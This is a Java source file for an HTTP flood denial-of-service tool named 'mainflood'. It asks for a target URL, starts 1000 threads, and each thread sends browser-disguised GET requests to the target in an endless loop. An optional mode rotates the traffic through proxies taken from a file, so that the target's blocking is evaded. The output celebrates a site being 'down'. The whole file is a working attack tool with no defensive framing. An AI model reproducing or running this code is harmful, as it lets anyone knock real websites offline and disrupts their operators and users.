
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.InetSocketAddress;
import java.net.ProxySelector;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Scanner;

import static java.net.http.HttpClient.Version.HTTP_2;

public class mainflood {

    public static String COOKIE = "";
    public static String proxyfile = "";
    public static String Cookie = "";
    public static String mode = "";

    public static void main(String[] args) throws Exception {
        String url = "";
        Scanner in = new Scanner(System.in);
        System.out.print("Enter Url: ");
        url = in.nextLine();
        if (url != null){
        } else {
            System.out.println("Url Incorrect Please try again");
            System.exit(0);
        }
        System.out.println("Enter Mode (proxy/raw): ");
        mode = in.nextLine();
        System.out.println("MODE: " + mode);
        if (mode.equals("proxy")){
            System.out.println("Enter proxy file: ");
            proxyfile = in.nextLine();
        }
        System.out.println("ATTACKED : " + url);

        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < 1000; i++) {
            Thread t = new Thread(new attack(url));
            t.start();
            System.out.println("Threads: " + i + " started");
        }
        System.out.println("Starting Attack To: " + url);

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {
                //e.printStackTrace();
            }
            System.out.println("Threads: " + i + "ended");
        }
    }

    static class attack implements Runnable{

        public static void floodproxy(String url) throws Exception{

            File file = new File(proxyfile);
            BufferedReader br = new BufferedReader(new FileReader(file));

            String st = br.readLine();
            List<String> givenList = new ArrayList<String>();
            while ((st = br.readLine()) != null)
                givenList.add(st);
            Random rand = new Random();
            String proxylist = givenList.get(rand.nextInt(givenList.size()));
            String proxyhost = proxylist.split(":")[0];
            String strproxyport = proxylist.split(":")[1];
            int proxyport = Integer.parseInt(strproxyport);

            HttpClient client = HttpClient.newBuilder()
                    // just to show off; HTTP/2 is the default
                    .version(HTTP_2)
                    .proxy(ProxySelector.of(new InetSocketAddress(proxyhost,proxyport)))
                    .connectTimeout(Duration.ofSeconds(3))
                    .build();
            HttpRequest request = HttpRequest.newBuilder()
                    .GET()
                    .uri(URI.create(url))
                    .headers(
                            "Cache-Control", "max-age=0",
                            "Upgrade-Insecure-Requests", "1",
                            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4324.104 Safari/537.36",
                            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                            "Accept-Encoding", "gzip, deflate, br",
                            "Cookie",Cookie,
                            "Accept-Language", "en-US;q=0.9")
                    .build();
            while (true){
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200){
                    System.out.println(response.statusCode() + " [" + "127.0.0.1" + "]" + " Sended to! > " + url);
                } else if (response.statusCode() == 403){
                    System.out.println(response.statusCode() + " [" + "127.0.0.1" + "]" +" Connection has been blocked!");
                } else if (response.statusCode() > 500){
                    System.out.println(response.statusCode() + " [" + "127.0.0.1" + "]" + " Has been down! > " + url);
                }
            }
        }

        public static void floodraw(String url) throws Exception{
            HttpClient client = HttpClient.newBuilder()
                    // just to show off; HTTP/2 is the default
                    .version(HTTP_2)
                    .connectTimeout(Duration.ofSeconds(3))
                    .build();
            HttpRequest request = HttpRequest.newBuilder()
                    .GET()
                    .uri(URI.create(url))
                    .headers(
                            "Cache-Control", "max-age=0",
                            "Upgrade-Insecure-Requests", "1",
                            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4324.104 Safari/537.36",
                            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                            "Accept-Encoding", "gzip, deflate, br",
                            "Cookie",Cookie,
                            "Accept-Language", "en-US;q=0.9")
                    .build();
            while (true){
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200){
                    System.out.println(response.statusCode() + " [" + "127.0.0.1" + "]" + " Sended to! > " + url);
                } else if (response.statusCode() == 403){
                    System.out.println(response.statusCode() + " [" + "127.0.0.1" + "]" +" Connection has been blocked!");
                } else if (response.statusCode() > 500){
                    System.out.println(response.statusCode() + " [" + "127.0.0.1" + "]" + " Has been down! > " + url);
                }
            }
        }

        public String threadNum;

        public attack(String threadNum) {
            this.threadNum = threadNum;
        }

        @Override
        public void run() {
            if (!mode.equals("proxy")){
                //System.out.println(mode);
                try {
                    floodraw(threadNum);
                } catch (Exception e){
                    //flood(threadNum);
                }
            } else {
                //System.out.println(mode);
                try {
                    floodproxy(threadNum);
                } catch (Exception e){
                    //flood(threadNum);
                }
            }
        }

    }

}